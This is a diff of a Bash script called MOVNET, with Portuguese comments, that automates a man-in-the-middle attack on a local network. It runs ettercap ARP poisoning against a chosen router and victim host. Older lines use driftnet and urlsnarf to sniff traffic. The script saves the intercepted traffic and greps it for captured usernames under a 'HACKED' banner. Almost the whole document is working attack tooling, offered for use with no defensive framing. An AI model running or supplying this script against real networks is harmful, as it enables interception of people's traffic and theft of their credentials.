@@ -1,10 +1,10 @@
 #!/bin/bash
 #--------------------------------------------------------------------------------------------------------------
-                            #Verificação do tipo de usuário, se é root ou não.
+                            #Verificação do privilégio do user
 
 [ $(id -u) -ne 0 ] && { echo -e "Do you not root"; sudo ./movnet.sh; exit ;} || echo -e "I'm root!"
 #--------------------------------------------------------------------------------------------------------------
-                           #aqui inicia a verificação de pacotes para instalação
+                           #verificação de pacotes para instalação
 
 
 echo -e "Analyzing packages...\n"
@@ -49,16 +49,6 @@ if [ -n "$pacote" ] ;
      read
      apt-get install figlet
 fi
-pacote=$(dpkg --get-selections | grep dialog )
-if [ -n "$pacote" ] ;
- then 
-     echo -e "Dialog ---------------------------------------- OK\n"
- else
-     echo -e "Dialog ----------------------------- Nao instalado\n"
-     echo "A aplicação Dialog será instalado, tecle [ENTER] para continuar."
-     read
-     apt-get install dialog
-fi
 clear
 
 #--------------------------------------------------------------------------------------------------------------
@@ -67,11 +57,11 @@ clear
 sleep 1
 figlet "         MOVNET"
 echo "                Movement On network"
-echo -e "Dev: @c0rj4\n"
+echo -e "Dev: @corjacrew\n"
 echo "------------------------------------------"
     echo
     echo -n "Find the IP of the target router, y/n? "
- read v0
+read v0
 if [ "$v0" = y ] ;
  then 
     route
@@ -81,38 +71,85 @@ if [ "$v0" = y ] ;
     echo -n ">> " ;read IP
     echo "------------------------------------------"
     echo
-   else
+    else
     echo
     echo "------------------------------------------"
    echo "Enter the target IP"
     echo -n ">> " ;read IP
     echo "------------------------------------------"
     echo
-fi    
+ fi    
     echo
     echo "Enter the network interface used"
-    echo -n ">> " ;read int
+    ip -br link | awk '{print "iface: "$1}'
+    echo -n ">> " ;read ith
     echo "------------------------------------------"
-     echo -n "Insert target host, y/n? "
-     read V
+    echo -n "Insert target host, y/n? "
+    read target
+    clear
+
 
 #--------------------------------------------------------------------------------------------------------------
-                                      #inicio do ataque MITM
+                                      #TARGET=YES
 
-if [[ "$V" = y ]]; then
+ if [[ "$target" = y ]]; then
     echo -n ">> " ; read alvo
-    driftnet -i $int&
+    ./tools.sh&
     xterm -e ./target.sh&
-    xterm -e ettercap -T -q -i $int -M arp:remote /$IP//&
-    urlsnarf -i $int | grep $alvo > log.txt
+    clear
+    figlet "         MOVNET"
+echo "                Movement On network"
+echo -e "Dev: @corjacrew\n"
+echo -e "***********************************************************"
+echo -e "*                                                         *"
+echo -e "*              Press CTRL+C to stop!                      *"
+echo -e "*                                                         *"
+echo -e "***********************************************************"
+    ettercap -T -q -i $ith -M arp:remote /$IP/$alvo/ > logs/ettercap.log
+#--
+kill $(ps aux | grep urlsnarf | cut -d" " -f6)
+sleep 1
+    clear
+figlet "         MOVNET"
+echo "                Movement On network"
+echo -e "Dev: @corjacrew\n"
+echo -e "***********************************************************"
+echo -e "*                        HACKED                           *"
+echo -e "***********************************************************"
+cat logs/ettercap.log | grep USER
+exit
 
-elif [[ "$V" = n ]]; then
-    driftnet -i $int&
+#--------------------------------------------------------------------------------------------------------------
+                                      #TARGET=NO
+
+ elif [[ "$target" = n ]]; then
+    ./tools.sh&
     xterm -e ./target.sh&
-    xterm -e ettercap -T -q -i $int -M arp:remote /$IP//&
-    urlsnarf -i $int > log.txt
+    clear
+    figlet "         MOVNET"
+echo "                Movement On network"
+echo -e "Dev: @corjacrew\n"
+echo -e "***********************************************************"
+echo -e "*                                                         *"
+echo -e "*              Press CTRL+C to stop!                      *"
+echo -e "*                                                         *"
+echo -e "***********************************************************"
+    ettercap -T -q -i $ith -M arp:remote /$IP// > logs/ettercap.log
+#--
+kill $(ps aux | grep urlsnarf | cut -d" " -f6)
+sleep 1
+    clear
+figlet "         MOVNET"
+echo "                Movement On network"
+echo -e "Dev: @corjacrew\n"
+echo -e "***********************************************************"
+echo -e "*                        HACKED                           *"
+echo -e "***********************************************************"
+cat logs/ettercap.log | grep USER
+exit
 
-else
+#------
+ else
   echo "------------------------------------------"
   echo "Unknown entry, run the script again. y/n?"
   echo -n ">> " ; read v1
